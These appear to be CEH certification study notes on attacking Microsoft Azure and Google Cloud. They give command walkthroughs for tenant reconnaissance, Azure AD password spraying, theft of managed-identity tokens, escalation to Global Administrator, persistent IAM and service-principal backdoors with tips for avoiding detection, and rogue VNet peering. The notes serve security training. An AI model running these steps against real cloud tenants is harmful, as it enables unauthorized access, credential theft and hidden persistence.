# 06 — Microsoft Azure and Google Cloud Hacking

> **CEH v13 Module 19 | Objectives 05 & 06: Demonstrate Microsoft Azure Hacking / Google Cloud Hacking**

---

## Microsoft Azure Hacking

### Azure Reconnaissance using AADInternals

Source: https://github.com

AADInternals is a PowerShell module used for administering Azure AD and Office 365. It provides a wide range of tools for reconnaissance, exploitation, and post-exploitation tasks in an Azure AD context.

```powershell
# Start tenant reconnaissance — fetches all verified domains and extracts information such as their type
Invoke-AADIntReconAsOutsider -Domain <domain name> | Format-Table

# Return login information for the user (or domain)
Get-AADIntLoginInformation -Domain <domain name>

# Return all registered domains from the tenant of the given domain
Get-AADIntTenantDomains -Domain <domain name>
```

**Additional AADInternals Commands (Table 19.10):**

| Command | Description |
|---------|-------------|
| `Get-AADIntEndpointInstances` | Returns Office 365 instances and information when the latest changes have been made |
| `Get-AADIntEndpointIps -Instance WorldWide` | Returns Office 365 IP addresses and URLs for the given instance |
| `Get-AADIntTenantDetails -Domain <domain name>` | Returns details for the given tenant |
| `Get-AADIntTenantID -Domain <domain name>` | Returns tenant id for a given user, domain, or Access Token |
| `Get-AADIntKerberosDomainSyncConfig -AccessToken` | Fetches the tenant's Kerberos domain sync configuration using the Azure AD Sync API |
| `Invoke-AADIntReconAsInsider` | Invokes the recon as an insider |
| `Get-AADIntOpenIDConfiguration -Domain <domain name>` | Returns the open ID configuration for given user or domain |
| `Get-AADIntServiceLocations \| Format-Table` | Shows tenant's true service locations |
| `Get-AADIntServicePlans \| Format-Table` | Returns information about tenant's service plans, such as name, id, status, and when first assigned |
| `Get-AADIntSubscriptions` | Returns tenant's subscription details, such as name, id, number of licenses, and when created |
| `Get-AADIntCompanyTags -Domain <domain name>` | Returns tags attached to the tenant |
| `Get-AADIntSyncConfiguration` | Returns synchronization details |
| `Get-AADIntTenantAuthPolicy` | Returns tenant's authorization policy, including user and guest settings |
| `Get-AADIntComplianceAPICookies` | Returns cookies used with compliance API functions |
| `Get-AADIntAzureADPolicies` | Shows Azure AD policies |

---

### Identifying Azure Services and Resources using MicroBurst

Source: https://github.com

Identifying Azure services and resources is crucial for attackers to map out the cloud environment and discover potential targets. By understanding the available services and resources, attackers can identify misconfigurations, vulnerabilities, and weaknesses to exploit.

**Steps to enumerate Azure services and resources using MicroBurst:**

```powershell
# Step 1: Import the MicroBurst module into an authenticated Az module PowerShell session
Import-Module .\MicroBurst.psm1

# Step 2: Create a folder for the function's output
New-Item -Name "microburst_output" -ItemType "directory"

# Step 3: Perform Azure services and resource enumeration
Get-AzDomainInfo -Verbose -Folder microburst-output

# Step 4: Open the output folder using file explorer
explorer microburst-output
```

This command obtains the enumerated results in CSV format and text files, stored in a specific output folder. Output files include: AZ_Resources.csv, AppServices.csv, appsettings_Vault_Policies.csv, Deployments.csv, Disks, RoleAssignments, Domain_Auth_EndPoints.csv, Domain_SPNs.csv, Resource_Groups.csv, SQL_Servers.csv, Users.csv, etc.

**Note:** To execute the commands above, the user does not require local administrative privileges. However, appropriate Azure AD and ARM permissions are necessary to perform enumeration. The user should have at least the Reader role to gather information about the Azure resources.

---

### Enumerating Azure Active Directory (AD) Accounts

#### Using AzureGraph

Source: https://github.com

AzureGraph is an Azure AD information-gathering tool that uses Microsoft Graphs. This tool helps attackers obtain all types of information from the Azure AD, such as users, devices, applications, and domains. It allows the attacker to query these data through the API in an easy and seamless manner through a PowerShell console. Additionally, the attacker can download all the information from the target cloud and use it completely offline.

```r
# Authenticate with AAD and create a new login session
gr <- create_graph_login()

# Run the following command to view all users present in the Azure AD tenant
gr$list_users()

# Retrieve information about the authenticated user
me <- gr$get_user("username")

# View the group that the authenticated user belongs to
head(me$list_group_memberships())

# Retrieve applications owned by the authenticated user/account
me$list_owned_objects(type="application_name")
```

---

### Password Spraying using Spray365

Source: https://github.com

The Spray365 tool allows attackers to identify valid credentials for Microsoft accounts (Office 365 / Azure AD). Attackers use this method to perform automated password guessing for Azure AD accounts. This method does not account for lockouts because logon attempts are performed against all user accounts simultaneously using a single password. If both on-premises and cloud accounts use the same password without an MFA, attackers will gain access to the target network through password spraying.

```bash
# Step 1: Generate an execution plan
python spray365.py generate normal -ep <execution_plan_filename> \
  -d <domain_name> -u <file_containing_usernames> \
  -pf <file_containing_passwords>

# Step 2: Spray credentials using an execution plan
python3 spray365.py spray -ep <execution_plan_filename>

# Step 3: Review results of the spraying operation
python3 spray365.py review <spray_results_json_filename>
```

---

### Identifying Attack Surface using Stormspotter

Source: https://github.com

Stormspotter is a tool that maps Azure and Azure Active Directory objects, helping attackers create a visual graph of the resources in an Azure subscription. This tool allows attackers to observe attack surfaces and find ways to move within the tenant.

The Stormcollector module within Stormspotter lists all the subscriptions that the provided credentials can access.

```bash
# Run Stormcollector in CLI mode (uses current Azure CLI authentication)
python3 sscollector.pyz cli

# Run the Stormcollector using a service principal name (SPN) for authentication
python3 sscollector.pyz spn -t <tenant> -c <clientID> -s <clientSecret>
```

**Flags:**
- `-t <tenant>` — Specifies the Azure tenant ID
- `-c <clientID>` — Specifies the client ID of the service principal
- `-s <clientSecret>` — Specifies the client secret associated with the service principal

---

### Collecting Data from AzureAD and AzureRM using AzureHound

Source: https://github.com

AzureHound is a data collector tool used to collect information from the Azure Active Directory (Azure AD) and Azure Resource Manager (AzureRM) environments. This information can then be imported into BloodHound for better visualization. This tool offers multiple authentication methods to gather data from Azure. These may include user credentials, a JSON Web Token (JWT), a refresh token, a service principal secret, or a service principal certificate.

```bash
# Print all the Azure tenant data to the standard output stream
azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT"

# Print all Azure tenant data to a file (JSON format)
azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o "mytenant.json"

# Start the data collection service for BloodHound
azurehound configure
azurehound start
```

**Note:** Follow the prompts after executing `azurehound configure` and proceed with the next command.

---

### Accessing Publicly Exposed Blob Storage using Goblob

Source: https://github.com

Goblob is a lightweight and fast enumeration tool designed to aid in the discovery of sensitive information exposed publicly in Azure blobs. This tool helps attackers discover vulnerabilities by performing vulnerability scanning and reconnaissance.

```bash
# Enumerate the public Azure blob storage URLs for a single storage account
./goblob <storageaccountname>

# Enumerate the public Azure blob storage URLs for multiple storage accounts
./goblob -accounts accounts.txt

# Enumerate with a custom list of blob storage container names
./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt

# Print the output results to a file
./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt -output results.txt
```

---

### Identifying Open Network Security Groups (NSGs) in Azure

Attackers can exploit open network security groups (NSGs) in Azure to gain unauthorized network access by targeting ports that allow unrestricted traffic. When NSG rules are configured to permit inbound traffic from any IP address on commonly used ports (SSH 22, HTTP 80, HTTPS 443, MySQL 3306), these services are exposed to the Internet.

#### Using Azure Portal

1. Navigate to the Azure Portal
2. In the left-hand menu, select "All services" and then search for and select "Network security groups"
3. Select the network security group (NSG) you want to review from the list
4. In the NSG settings, select "Inbound security rules" or "Outbound security rules" to review the rules
5. Check for any rules that allow access from 0.0.0.0/0, indicating unrestricted traffic from any IP address

#### Using Azure CLI

```bash
# View all network security groups
az network nsg list --out table

# View detailed information about a specific NSG
az network nsg show --resource-group <ResourceGroupName> --name <NSGName>

# List all the security rules within a specific NSG
az network nsg rule list --resource-group <ResourceGroupName> --nsg-name <NSGName> --output table

# Filter to inbound rules open to any source IP
az network nsg rule list --resource-group <ResourceGroupName> --nsg-name <NSGName> \
  --query "[?direction=='Inbound' && sourceAddressPrefix=='*']" --output table
```

---

### Exploiting Managed Identities and Azure Functions

Attackers can potentially exploit the managed identity to authenticate with any service that allows Azure AD authentication without manually managing the login details. This involves leveraging a managed identity to gain unauthorized access to resources, execute malicious code, or exfiltrate sensitive data by impersonating legitimate services.

```bash
# Step 1: Exploit command-injection vulnerability in the Azure Function to obtain access token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" \
  -H secret:$IDENTITY_HEADER

# Step 2: Install Az PowerShell module and authenticate with the obtained access token
Install-Module -Name Az -Repository PSGallery -Force
Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>

# Step 3: List the resources to which the managed identity has access
Get-AzResource

# Step 4: Check the managed identity has permission to access the storage account keys
Get-AzStorageAccountKey -ResourceGroupName "<resource_group>" -AccountName "<account_name>"

# Step 5: Use the obtained key to connect to the storage account through Azure Storage Explorer

# Step 6: After connecting, look for containers in the storage account
# Step 7: They can find multiple containers, including sensitive information (e.g., a flag)
```

---

### Privilege Escalation Using Misconfigured User Accounts in Azure AD

```powershell
# Step 1: Discover a normal user account using BloodHound or AzureHound

# Step 2: Login with the normal user account
Connect-AzureAD

# Step 3: Create a new key credential and export as certificate
$pwd = <password>
$path = <thumbprint>
Export-PfxCertificate -cert $path -FilePath <path_to_save_.pfx_file> -Password $pwd

# Step 4: Upload the self-signed certificate into Azure AD (in the certificate portion of the registered application)

# Step 5: Escalate the normal user to Global Administrator
Connect-AzureAD -TenantId <tenant_id> -ApplicationId <app_id> -CertificateThumbPrint <thumbprint>
Add-AzureADDirectoryRoleMember -RefObjectId <normaluser_object_ID> -ObjectId <GlobalAdmin_ID>

# Step 6: Verify in Azure AD that the role assigned is Global Administrator
```

**Note:** Steps 3-5 require significant privileges, typically available only to administrators or users with high-level directory management permissions.

---

### Creating Persistent Backdoors in Azure AD using Service Principals

The primary purpose of creating backdoors with Azure AD roles is to maintain persistent access to an organization's cloud resources without leaving any traces. Attackers leverage Azure AD roles to create backdoors by assigning themselves or a controlled user /service principal to privileged roles.

```bash
# Step 1: Identify the target role in the Azure environment
az role definition list --output table

# Step 2: Create a new service principal and note the client ID and secret
az ad sp create-for-rbac --name <service-principal-name>

# Step 3: Assign a privileged role to the service principal
az role assignment create --assignee <service-principal-id> --role <role-name>

# Step 4: Verify the role assignment
az role assignment list --assignee <service-principal-id>

# Step 5: Use a legitimate name to appear less suspicious
# Example: "ProductionServicePrincipal"
az ad sp create-for-rbac --name ProductionServicePrincipal

# Rotate credentials periodically to avoid detection
az ad sp credential reset --name <service-principal-id>

# Assign the "Owner" role as an example
az role assignment create --assignee <service-principal-id> --role "Owner"
az role assignment list --assignee <service-principal-id> --output table
```

**Note:** These commands require elevated privileges, typically provided by the Directory.ReadWrite.All and RoleManagement.ReadWrite.Directory permissions in Azure AD.

---

### Exploiting VNet Peering Connections

Source: https://microsoft.com

Virtual Network (VNet) peering connections are a feature of Azure that enables the connection and communication of two or more virtual machines for sharing information. Attackers can exploit a VNet to move laterally within the network and gain illegitimate access to crucial resources.

```bash
# Create unauthorized peering connections
az network vnet peering create -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet \
  --remote-vnet TargetVnetId \
  --allow-vnet-access

# Enable traffic forwarding (allows traffic from compromised VMs to traverse the peered VNet)
az network vnet peering update -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet \
  --set allowForwardedTraffic=true

# Initiate remote gateway usage (use the target VNet's VPN gateway)
az network vnet peering update -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet \
  --set useRemoteGateways=true

# Enable gateway transit (use the target's VPN gateway to access the network)
az network vnet peering update -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet \
  --set allowGatewayTransit=true

# Delete existing legitimate peer connections to disrupt normal network paths
az network vnet peering delete -g TargetResourceGroup \
  -n TargetVnetToAnotherVnet \
  --vnet-name TargetVnet

# Synchronize peering connections (enforce their configurations)
az network vnet peering sync -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet
```

---

### AzureGoat — Vulnerable by Design Azure Infrastructure

Source: https://github.com

AzureGoat is vulnerable to the design infrastructure on Azure that showcases the latest OWASP Top 10 web application security risks (2021) and other common misconfigurations based on services such as App Functions, CosmosDB, Storage Accounts, Automation, and Identities. The tool allows attackers to mimic real-world infrastructure but with added vulnerabilities. It offers attackers multiple escalation paths and is designed using a black-box testing approach.

**Practice scenarios:**

1. **Insecure Direct Object Reference** — leverage insecure direct object reference vulnerabilities to exploit the target user's account and change passwords
2. **Server-Side Request Forgery (SSRF)** — execute an SSRF attack to abuse server functionality that can access or modify resources
3. **Security Misconfiguration** — identify security misconfigurations for accessing sensitive information from Azure resource groups; use the misconfigurations to fetch the storage container component list and explore open ports in a network
4. **Privilege Escalation** — leverage misconfiguration and escalate privileges to the resource group owner

---

## Google Cloud Platform (GCP) Hacking

### Enumerating GCP Resources using Google Cloud CLI

Enumerating the Google Cloud Platform (GCP) involves systematically discovering all the resources, services, configurations, and permissions within a GCP environment. This helps attackers identify critical assets, identify spot misconfigurations, and uncover various vulnerabilities.

#### Organizations, Projects, and Cloud Storage Buckets

```bash
# List organizations accessible by the target user account (with org IDs)
gcloud organizations list

# View all folders that the user has access to within a specified organization
gcloud resource-manager folders list --organization=<organization_id>

# Identify all active projects where the current account holds owner/editor/browser/viewer permission
gcloud projects list

# List all cloud storage buckets within the default project
gsutil ls

# List cloud storage buckets for a particular project using the -p flag
gsutil ls -p <project_id>

# Retrieve the permissions on a specific cloud storage bucket
gsutil iam get gs://<bucket_name>

# Find the bucket content, including the objects and names of the subdirectories it contains
gsutil ls gs://<bucket_name>

# Use the -r option to recursively list bucket contents
gsutil ls -r gs://<bucket_name>
```

#### Google Cloud Service Accounts

Enumerating Google Cloud service accounts helps attackers identify accounts and permissions. This reveals high-privileged accounts that unauthorized access or escalation. Exploiting these factors can lead to infrastructure compromises and data theft.

```bash
# List service accounts in the current project
gcloud iam service-accounts list

# Use the --project flag to retrieve detailed information for a particular service account
gcloud iam service-accounts describe <service_account_email> --project <project_id>

# Find all the roles associated with a service account
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:service_account_email"

# Retrieve the access token for a target service account
gcloud auth print-access-token --impersonate-service-account=<service-account-email>
```

#### Google Cloud IAM Roles and Policies

```bash
# List predefined or custom roles for an organization or project
gcloud iam roles list [--show-deleted] [--organization=<organization>] [--project=<project_id>]

# Retrieve metadata and permissions of a role
gcloud iam roles describe <role_id> [--organization=<organization>] [--project=<project_id>]

# Get IAM policy at organization/project/folder level
gcloud organizations get-iam-policy <organization_id>
gcloud projects get-iam-policy <project_id>
gcloud resource-manager folders get-iam-policy <folder_id>
```

#### Google Cloud Resources

```bash
# Identify all Compute Engine instances in a project
gcloud compute instances list

# Retrieve all data associated with a Compute Engine VM in a specific zone
gcloud compute instances describe <instance> --zone <zone>

# List the service accounts associated with a Compute Engine instance
gcloud compute instances describe INSTANCE_NAME \
  --zone=<zone> \
  --format="table(serviceAccounts.scopes)"

# List Cloud SQL instances associated with the current project
gcloud sql instances list

# Enumerate SQL databases associated with the current project
gcloud sql databases list --instance=<instance_name>
```

---

### Enumerating GCP Resources using gcp_service_enum

Source: https://github.com

`gcp_service_enum` is a Python script that allows attackers to discover various GCP services, including Compute Engine instances and Cloud Storage buckets. Attackers can use this tool to identify publicly accessible resources and misconfigurations within a targeted Google Cloud account.

```bash
# Enumerate services on a targeted GCP account using a service account key file
gcp_enum_services.py -f <service account key file> --output-file <output file>
```

---

### Enumerating GCP Resources using GCP Scanner

Source: https://github.com

GCP Scanner allows attackers to determine the level of access that certain credentials possess within GCP and evaluate IAM permissions for compromised VMs, containers, GCP service accounts, or leaked OAuth2 token keys. It supports a wide range of GCP resources including GCS, GCE, GKE, App Engine, Cloud SQL, BigQuery, Spanner, Pub/Sub, Cloud Functions, BigTable, CloudStore, KMS, and Cloud Services.

GCP Scanner can extract and use credentials such as GCP VM instance metadata, user credentials from gcloud profiles, OAuth2 Refresh Tokens with cloud-platform scope, and service account keys in JSON format.

```bash
# Enumerate resources and permissions within a target GCP environment
python3 scanner.py -o <output file> -g <Gcloud profile path>
```

**Flags:**
- `-o` — Specifies the output file where the results are saved
- `-g` — Path to the gcloud profile containing the credentials to be used for scanning

---

### Enumerating Google Cloud Storage Buckets using cloud_enum

Source: https://github.com

The cloud_enum tool is a multi-cloud OSINT tool that enables attackers to enumerate public resources across AWS, Azure, and Google Cloud environments. Using this tool, attackers can retrieve information from open or publicly accessible GCP buckets, Firebase Realtime Databases, Google App Engine sites, cloud functions, and open Firebase applications.

```bash
# Enumerate Google Cloud Storage Buckets using cloud_enum
# --disable-aws and --disable-azure flags skip those providers for faster GCP-only scanning
cloud_enum.py -k <keyword> --disable-aws --disable-azure
```

**Alternative tool:** GrayhatWarfare — used to identify and access publicly accessible storage buckets on Google Cloud Platform.

---

### Enumerating Privilege Escalation Vulnerabilities using GCP Privilege Escalation Scanner

Source: https://github.com

The GCP Privilege Escalation Scanner is a Python script that an attacker can use to identify potential privilege escalation vulnerabilities within GCP environments. This scanner evaluates IAM policies and permissions across GCP resources to detect misconfigurations and weaknesses that could allow an attacker to gain elevated privileges.

```bash
# Step 1: List all permissions of each member within the targeted GCP project
python3 enumerate_member_permissions.py --project-id test-<project ID>

# Step 2: Using the enumerated permissions, scan for potential privilege escalation vulnerabilities
python3 check_for_privesc.py
```

**Step 3: Review the output files:**
- `all_org_folder_proj_sa_permissions.json` — contains a list of all the members and their associated permissions within a project
- `privesc_methods.txt` — lists all the identified methods that can be used to escalate privileges within the GCP environment
- `setIamPolicy_methods.txt` — details all the detected methods that involve setting IAM policies that can be exploited for privilege escalation

*Note: Reading and managing permissions specific to IAM resources are generally sufficient to perform this activity.*

---

### Escalating Privileges of Google Storage Buckets using GCPBucketBrute

Source: https://rhinosecuritylabs.com

GCPBucketBrute is a script-based tool that allows attackers to enumerate Google storage buckets, check their access levels, and determine if they can be privilege-escalated.

**How it works:**
- Attackers check the bucket's policy by making a direct HTTP request to `https://www.googleapis.com/storage/v1/b/BUCKETNAME/iam`
- If "allUsers" or "allAuthenticatedUsers" can read the bucket policy, the bucket is privilege-scalable
- Attackers can also use the Google storage `TestIamPermissions` API by providing a bucket name and a list of Google storage permissions to retrieve the bucket permissions

```bash
# Basic scan for bucket name permutations (example)
python3 gcpbucketbrute.py -k testtest -a
```

If attackers have some access to the discovered buckets, GCPBucketBrute displays a list of the possessed permissions. If attackers have enough access to escalate privileges to the bucket, the tool shows a message showing the bucket is vulnerable to privilege escalation.

---

### Maintaining Access: Creating GCP IAM Backdoors

**Note:** Attackers can perform these activities only after escalating their privileges to the administrative level.

```bash
# Step 1: Create new IAM roles with elevated permissions
gcloud iam roles create <ROLE_NAME> --project=<PROJECT_ID> --file=role-definition.yaml

# Step 2: Assign roles to service accounts for persistent future access
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member=serviceAccount:<SERVICE_ACCOUNT>@<PROJECT_ID>.iam.gserviceaccount.com \
  --role=roles/<ROLE_NAME>
```

---

### GCPGoat — Vulnerable by Design GCP Infrastructure

Source: https://github.com

GCPGoat is vulnerable to GCP design infrastructure that allows attackers to test and improve their attacking skills by exploiting common misconfigurations and vulnerabilities, including XSS, server-side request forgery, weak storage bucket implementation, and IAM privilege escalation. Emulates real-world infrastructure; GCPGoat highlights the latest OWASP Top 10 web application security risks for 2021 and other typical misconfigurations in services such as IAM, storage buckets, cloud functions, and Compute Engine.

**Practice scenarios:**

1. **Server-Side Request Forgery (SSRF)** — perform an SSRF attack, fetch the source code file from the cloud function and dump the database to overtake the admin account of the target blog application
2. **Misconfigured Storage Bucket Policies** — use the misconfigured bucket policies to gain admin access to one of the buckets
3. **Lateral Movement** — find the credential for a low-privileged virtual machine instance from the dev bucket and then access other high-privileged Compute Instances through that low-privileged machine
